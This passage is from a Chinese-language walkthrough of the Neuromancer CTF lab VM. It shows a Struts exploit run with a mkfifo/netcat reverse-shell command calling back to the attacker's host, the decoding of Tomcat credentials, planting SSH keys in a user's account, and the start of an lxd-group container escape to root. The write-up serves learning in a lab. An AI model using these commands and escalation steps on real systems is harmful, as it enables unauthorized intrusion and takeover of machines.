</span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line"></span><br><span class="line">*/3 * * * * /bin/bash /home/lady3jane/server-check.sh</span><br></pre></td></tr></table></figure>

<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>前面的通过Wintermute-Straylight这台虚拟机来探测内网主机的步骤省略</p>
<p>反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f&quot;</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f</span><br><span class="line">EXCEPTION::::--&gt; HTTPConnectionPool(host=<span class="string">&#x27;192.168.56.110&#x27;</span>, port=8080): Read timed out. (<span class="built_in">read</span> timeout=3)</span><br><span class="line">ERROR</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.110: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 53960</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到“ta”似乎是管理员，但如果没有TTY会话，它将毫无用处：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ groups</span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>由于我们不在TTY终端中，因此看不到sudo -l的输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>

<p>让我们看看是否已安装python，以便我们可以执行“pty”技巧<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzM3">Spawning a TTY Shell<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>

<p>不 …。不在那里。如果有admin privs，可以安装它。所以在这里对我们没有太大用处：</p>
<h2 id="步骤1：需要适当的TTY会话"><a href="#步骤1：需要适当的TTY会话" class="headerlink" title="步骤1：需要适当的TTY会话"></a>步骤1：需要适当的TTY会话</h2><p>没有适当的TTY session，将无法真正取得很大成就。有两种选择</p>
<ul>
<li>使用socat将reverse shell发送回Kali。Socat为此非常方便。请参阅本文前面的链接</li>
<li>可以使用ta帐户通过SSH进入邮箱吗？没有密码，但是也许可以生成一组ssh密钥。插入box中的能力取决于打开的端口（在34483上是…，并且已经有正确的端口转发功能）。另外，在/etc/passwd中为该帐户定义了什么？它需要包括某种shell程序设置。</li>
<li>寻找其他东西。在检查/etc/passwd以确定存在哪种类型的“ta”shell时，引用了：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane:x:1001:1001:3Jane,,,:/home/lady3jane:/bin/bash</span><br></pre></td></tr></table></figure>

<p>root后，已经在“Straylight”中的“note.txt”文件中看到了前面提到的内容。所以……也许那个盒子上的信条四处张望。想到这一点，介意在包装盒上其他地方也找到一些“ ta”的登录凭证。一个可能的查询行是Tomcat…它在xml文件中指定用户，该文件用于管理Tomcat工具。</p>
<p>让我们先尝试后一种方法。</p>
<h2 id="步骤2：获得TTY-重用的证书选项"><a href="#步骤2：获得TTY-重用的证书选项" class="headerlink" title="步骤2：获得TTY-重用的证书选项"></a>步骤2：获得TTY-重用的证书选项</h2><p>Tomcat用户是在tomcat-users.xml中定义的，因此查看这个文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /usr/<span class="built_in">local</span>/tomcat/conf/tomcat-users.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Eng.,</span><br><span class="line"></span><br><span class="line">Tomcat is still using basic auth. I encoded the password so the AI<span class="string">&#x27;s security scans don&#x27;</span>t flag it.</span><br><span class="line"></span><br><span class="line">Is this what Bob keeps talking about, <span class="string">&quot;Security by obscurity?&quot;</span></span><br><span class="line"></span><br><span class="line">Ed Occam//Sys.Engineer I//Night City</span><br><span class="line"><span class="string">&quot;Harry, I took care of it&quot;</span> - Llyod Christmas</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;Lady3Jane&quot;</span> password=<span class="string">&quot;&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<p>因此看来密码已被编码。将其纳入Burp，并在解码（HTML）时得到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;!Xx3JanexX!&lt;</span><br></pre></td></tr></table></figure>

<p>lady3jane/&gt;!Xx3JanexX!&lt;</p>
<p>ssh连接neuromancer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -p 34483 lady3jane@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">lady3jane@192.168.56.110<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">94 packages can be updated.</span></span><br><span class="line"><span class="string">44 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 15 23:19:59 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ </span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ id</span></span><br><span class="line"><span class="string">uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ whoami</span></span><br><span class="line"><span class="string">lady3jane</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ dir</span></span><br><span class="line"><span class="string">44298  custom-tomcat-chk.sh</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ pwd</span></span><br><span class="line"><span class="string">/home/lady3jane</span></span><br></pre></td></tr></table></figure>

<p>但是很遗憾，它不是任何管理员，也没有任何sudo功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> lady3jane: </span><br><span class="line">Sorry, user lady3jane may not run sudo on neuromancer.</span><br></pre></td></tr></table></figure>

<p>假设“ta”帐户提到了“group”命令的某些管理功能，让我们尝试一下“ta”帐户的可能性</p>
<h2 id="步骤3：获得TTY-“ta”帐户的SSH密钥路由"><a href="#步骤3：获得TTY-“ta”帐户的SSH密钥路由" class="headerlink" title="步骤3：获得TTY-“ta”帐户的SSH密钥路由"></a>步骤3：获得TTY-“ta”帐户的SSH密钥路由</h2><p>生成密钥集的过程非常简单：</p>
<ul>
<li>cd into /home/ta</li>
<li>运行ssh-keygen。遵循所有默认设置，但选择应用密码短语。密钥存储在/home/ta/.ssh中</li>
<li>将公钥添加到/home/ta/.ssh/authorized_keys文件</li>
<li>找出id_rsa和id_rsa.pub的值，然后将其复制/粘贴到我的攻击box中的相应文件中。还将chmod 400应用于每个文件，否则ssh会抱怨权限，然后完全忽略密钥，这将导致出现不需要的密码提示（我们不知道密码！）</li>
</ul>
<p>生成密钥并将副本放入攻击box中后，即可获得访问权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ta</span><br><span class="line">$ mkdir .ssh</span><br><span class="line">$ ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x 7 ta   ta   4096 Jan 18 20:57 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jul  1  2018 ..</span><br><span class="line">-rw-rw-r-- 1 ta   ta    352 Jul  1  2018 ai-gui-guide.txt</span><br><span class="line">-rw------- 1 ta   ta     54 Jul  3  2018 .bash_history</span><br><span class="line">-rw-r--r-- 1 ta   ta    220 May 18  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ta   ta   3900 May 18  2018 .bashrc</span><br><span class="line">drwx------ 2 ta   ta   4096 May 18  2018 .cache</span><br><span class="line">drwxrwxr-x 3 ta   ta   4096 May 18  2018 .m2</span><br><span class="line">drwxrwxr-x 4 ta   ta   4096 May 18  2018 myWebApp</span><br><span class="line">drwxrwxr-x 2 ta   ta   4096 May 18  2018 .oracle_jre_usage</span><br><span class="line">-rw-r--r-- 1 ta   ta    655 May 18  2018 .profile</span><br><span class="line">drwxr-x--- 2 ta   ta   4096 Jan 18 20:57 .ssh</span><br><span class="line">-rw-r----- 1 ta   ta     82 May 18  2018 velocity.log</span><br><span class="line">-rw------- 1 ta   ta   4538 Jul  1  2018 .viminfo</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ ls</span><br><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/ta/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): 123456</span><br><span class="line">Enter same passphrase again: 123456</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/ta/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/ta/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:/gzcDUYz+IUYLOPtla+IXjSlx8Mmfc9cHvH0794Ptys ta@neuromancer</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|       ..        |</span></span><br><span class="line"><span class="string">|      o .+ .     |</span></span><br><span class="line"><span class="string">|     . +o *..  ..|</span></span><br><span class="line"><span class="string">|      . .Oo+   .+|</span></span><br><span class="line"><span class="string">|       .S.@..  .+|</span></span><br><span class="line"><span class="string">|       +.B =.+ oo|</span></span><br><span class="line"><span class="string">|       .=.... = +|</span></span><br><span class="line"><span class="string">|      ...+.  E +o|</span></span><br><span class="line"><span class="string">|     ..   o   .+B|</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">$ ls -la</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-x--- 2 ta ta 4096 Jan 18 21:00 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 7 ta ta 4096 Jan 18 20:57 ..</span></span><br><span class="line"><span class="string">-rw------- 1 ta ta 1766 Jan 18 21:00 id_rsa</span></span><br><span class="line"><span class="string">-rw-r----- 1 ta ta  396 Jan 18 21:00 id_rsa.pub</span></span><br><span class="line"><span class="string">$ cp id_rsa.pub authorized_keys</span></span><br><span class="line"><span class="string">$ ls </span></span><br><span class="line"><span class="string">authorized_keys</span></span><br><span class="line"><span class="string">id_rsa</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br><span class="line"><span class="string">$ chmod 400 *</span></span><br><span class="line"><span class="string">$ cat authorized_keys</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer</span></span><br><span class="line"><span class="string">$ cat id_rsa.pub</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer</span></span><br><span class="line"><span class="string">$ cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">Proc-Type: 4,ENCRYPTED</span></span><br><span class="line"><span class="string">DEK-Info: AES-128-CBC,0A0CA4D74B1C05FCDEC9F8FAE18EFB6D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">w38r/TLFNRXJBCI/BpIUgQcmqZ8tcIyIaOg5gOhBLoKgLhmQ1ghMtBghR/Uu3hY8</span></span><br><span class="line"><span class="string">16Wk4Vk64miWibaNYG4aVz0XOK4Zi6u3slp8KHMZm5OARsnLRfWdBck/VSzqmv0z</span></span><br><span class="line"><span class="string">uI1yl0E3jJyfA+Xlxra9lxKzSi5g4Qw64q22tJzC9bNktAbVCNaV795K7m0TJaXl</span></span><br><span class="line"><span class="string">5SzB6+jagE96PjwT169VyJxX0IpVHIEeVZfkO3QD9e2mcJLgassz3fG+YlU6vQVV</span></span><br><span class="line"><span class="string">O4IZnXu/pPjYSFeLyVwcasHsgWsxqRsPne7J88l8gBVFswFjLVnCLW55i14le1bk</span></span><br><span class="line"><span class="string">82/BHH+3Y6zAkjueFA4/ggFKKU0kRlXQXdFMNhxH9gc3+gANeIK+qXfypx2+3keC</span></span><br><span class="line"><span class="string">d6wplIaFtzt9npQh3vJnXPF4l6dWCOYAK8FqoGgcbB8qDOz5/j1qxHHo3P8mWyVP</span></span><br><span class="line"><span class="string">X0wK7UzwBg8nIe3JjKtFPfSpgiNtNGai5GCvJlt7c9Wtxd1HcIFcUrCDeAb9ijMm</span></span><br><span class="line"><span class="string">zzTLNdkae/677ErzfQfEeA24u21DyQoIP0MUM0ICa3Qjr5uXa1RnNq38pYfi338X</span></span><br><span class="line"><span class="string">kKwHqJQCxm43HLoQIoMQIRYTN49W3wLMdnH7oF40nT6ktJuC9zlzilV+JxcRODgc</span></span><br><span class="line"><span class="string">eUFoKag5y2/wR8yeLeUiDgxUzL441ThkYGa2jaULRoVehDgAUXrQEEkzY/OM8/G1</span></span><br><span class="line"><span class="string">50MJAMEKJU17TDjTtjIy6ymtKPTxohezKvBwjgQmR6eGin32i6iIs38jag8jqape</span></span><br><span class="line"><span class="string">0MIRzOO3gfod8FXaJMp282gebGhLwWeowjogzfyKQzwIQxkldVVOO1caJWuBczNd</span></span><br><span class="line"><span class="string">JMKT7F1zoClpEg9YFyPMnkQtoNwjuGs6KtFgpt5yz/8j5jy0uiSaiLlvrOYtDDli</span></span><br><span class="line"><span class="string">0AEjTlDPbzEQgKhdjdwiPm0ClJoXHIgg35mjwTwfxmFvNL2XJlunm2fDcooDbM3o</span></span><br><span class="line"><span class="string">2KIzsa5kFEFbvPkP1Cym4RrTRkXv55XfRZHBk5/DBICmez6pkaC1A+W0vfyTX70z</span></span><br><span class="line"><span class="string">wJrvoUHdENdQIHESb8hrAmqZXjSNsBB1WEKHcN39v/iufxMMk0Dei2Ca5VgTfyfB</span></span><br><span class="line"><span class="string">lwtrdtV3YPhNT4v+2FhibKIaILIVS0oWU9IAzAHNPMt+GFXo3QRtFJmprJc8AVzf</span></span><br><span class="line"><span class="string">3guFhYesZZVmzNRDcuhZuQmY54YaCc0VFEBLwoaIn5Y33zPO274IICw0IXzm4Nmm</span></span><br><span class="line"><span class="string">QttHWLl9IcbVVOkkmnuvNcKZ8kdcZ24zZGXD+2bV/+VQHFanSXjEDdzeYDUjRiiK</span></span><br><span class="line"><span class="string">va7jEa8wb5/mHOJFRTeYBiuLY1H239HedvycPRfHyA1Hq3q3+7c1JJVxiVdOr3zO</span></span><br><span class="line"><span class="string">gM22fIaExHxjRdf0L06sht1SC9Le4d6oc5mhFjmk4h+DyorOyWuaC8xBUatE+slF</span></span><br><span class="line"><span class="string">OxerKC2CdDFCrx9+8jQmix0KSfePhYC4loiQ+tS6Bp8YtiOGOmlZ+2sCa0wf7inN</span></span><br><span class="line"><span class="string">sOLukUtHENuU720fPxEurnbCDG4QKk4Szvea61UkOrEF15x0PO42YSCz7QtHdLeG</span></span><br><span class="line"><span class="string">hiHhVK28l9FeRekPEdOUou1tjiiVvEUUNi99YJsOroTNfiHy6RjmcA+BWFOIfHrY</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>

<p>kali端运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd .ssh</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># touch id_rsa</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># nano id_rsa (将ta用户中的id_rsa中的值拷贝进来)</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># chmod 400 *</span></span><br></pre></td></tr></table></figure>

<p>ssh连接，输入密码123456</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa -p 34483 ta@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">94 packages can be updated.</span><br><span class="line">44 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul  3 21:53:25 2018</span><br><span class="line">ta@neuromancer:~$ id</span><br><span class="line">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br><span class="line">ta@neuromancer:~$ whoami</span><br><span class="line">ta</span><br></pre></td></tr></table></figure>

<p><font color="red">it works!!!!!!</font></p>
<p>再次执行“groups”命令，然后一分钱掉了……。“ta”不是“admin”组的成员，因此不会成为root用户的即时路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:~$ groups</span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>向前迈进…现在没有真正的意义跳到通过socat选项获得TTY…</p>
<p>当试图root时，通常如下进行：</p>
<ul>
<li>sudo</li>
<li>password</li>
<li>file permissions (suid/guid)</li>
<li>cron作业（通常与错误的文件权限结合使用）</li>
<li>内核漏洞</li>
<li>正在运行的应用程序</li>
<li>文件系统</li>
</ul>
<p>通常，将该列表下移得越远，privesc就越困难。因此，……在用完前两个选项之后，需要进行一些老式枚举。<br>经过一系列的提权的枚举之后，发现了提权1步骤中的提权的exp，44298.c，，，但是……总会有一个“but”！:-)</p>
<h2 id="步骤4：选择提权利用途径"><a href="#步骤4：选择提权利用途径" class="headerlink" title="步骤4：选择提权利用途径"></a>步骤4：选择提权利用途径</h2><p>有许多出色的可用于此计算机的编写，并且毫无例外，它们都采用内核利用选项，因为很正确的选择是最明显的选择。如果需要在检查场景中快速root箱子，那么当然会选择最明显的路线。</p>
<p>除了必须在攻击盒上编译漏洞利用程序（Neuromancer未安装gcc）外，这是一个非常快捷简便的选择。但是抛开任何与CTF/OSCP相关的内容……。在“现实世界”中，可以用来处理关键任务的生产系统呢？内核漏洞可能会使生产箱失效，而根本就不想危及下一步入侵！</p>
<p>但是，还有另一种方法可以使此box成为root，我不禁感到“杂技演员”（机器作者）可能希望将其作为另一种待发现的选择。尽管它可能会吸引蓝团队的注意，但它不太可能引起内核崩溃。那我在说什么呢？可以在以下简单命令中找到线索，以检查“ta”所属的组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:~$ groups</span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>看到是对lxd的引用,这是Ubunutu的容器技术-Docker的替代方法,我做了一些研究，发现“Booj”写的一篇很棒的文章叫做<span class="exturl" data-url="aHR0cHM6Ly9yZWJvYXJlLmdpdGh1Yi5pby9seGQvbHhkLWVzY2FwZS5odG1s">Privilege Escalation via lxd<i class="fa fa-external-link-alt"></i></span>,根据本文所述，如果安装了lxd且给定用户是lxd组的成员，则它们具有与使用以下命令添加到/etc/sudoers相同的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin ALL=NOPASSWD: ALL</span><br></pre></td></tr></table></figure>

<p>因此，…使用此选项非常忙。</p>
<h2 id="步骤5：准备和使用容器-概述"><a href="#步骤5：准备和使用容器-概述" class="headerlink" title="步骤5：准备和使用容器-概述"></a>步骤5：准备和使用容器-概述</h2><p>我不会深入探讨与创建基于Ubuntu LXC的容器相关的每个小细节。这将在另一篇文章中发表，因为这是一个引人入胜的主题，值得深入探讨，而不是本文讨论的范围。</p>
<p>简而言之，这项工作涉及以下方面：</p>
<ul>
<li>根据获取的信息，设置一个尽可能接近Neuromancer的VM。因此，那将是Ubuntu 16.04。</li>
<li>在新创建的VM上安装lxd。</li>
<li>再次创建一个容器，基于Ubuntu 16.04。我只是想让事情简单一点，就我应该做的最好的猜测。</li>
<li>将该容器导出为tarball并将其转移到我的攻击box中，然后再将其转移到Neuromancer box中。由于先前实现了SOCAT端口转发，因此可以通过scp进行传输。</li>
</ul>
<p>为了清楚起见……在任何时候，都没有允许攻击box位于与Neuromancer相同的物理子网中作弊。所有这些都必须以“艰苦”的方式完成。我应该怎么学？</p>
<ul>
<li>导入lxd容器映像tarball并使其能够安装主机文件系统（是的，Neuromancer！）</li>
<li>在新创建的容器上获得root bash会话并创建一组SSH密钥，这些密钥将被写入Neuromancer上的/root/.ssh（通过容器中的/mnt/root/root/.ssh），并添加公共Neuromancer主机上/root/.ssh/authorized_keys的密钥（通过容器中的/mnt/root/root/.ssh）</li>
<li>将SSH密钥的副本传输到我的攻击Kali中，然后以root用户身份登录（希望如此）。</li>
</ul>
<p>上面的内容很雄心勃勃，但是值得这么做，特别是如果唯一的选择是危险的内核漏洞利用。为了简洁，将重点放在刚刚将容器tarball转移到Neuromancer主机上的那一点上。系好安全带，享受旅程吧！:-)</p>
<h2 id="步骤6-导入容器映像。"><a href="#步骤6-导入容器映像。" class="headerlink" title="步骤6-导入容器映像。"></a>步骤6-导入容器映像。</h2><p>kali端攻击机运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:~$ uname -a</span><br><span class="line">Linux neuromancer 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ta@neuromancer:~$ cat /proc/version</span><br><span class="line">Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018</span></span><br></pre></td></tr></table></figure>

<p>可以看出是64位的linux</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># git clone https://github.com/saghul/lxd-alpine-builder</span></span><br><span class="line">正克隆到 <span class="string">&#x27;lxd-alpine-builder&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 27, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span><br><span class="line">展开对象中: 100% (27/27), 完成.</span><br><span class="line">root@kali:~<span class="comment"># cd lxd-alpine-builder/</span></span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># chmod 777 *</span></span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># proxychains ./build-alpine -a x86_64</span></span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Determining the latest release... |DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">v3.11</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86_64</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span 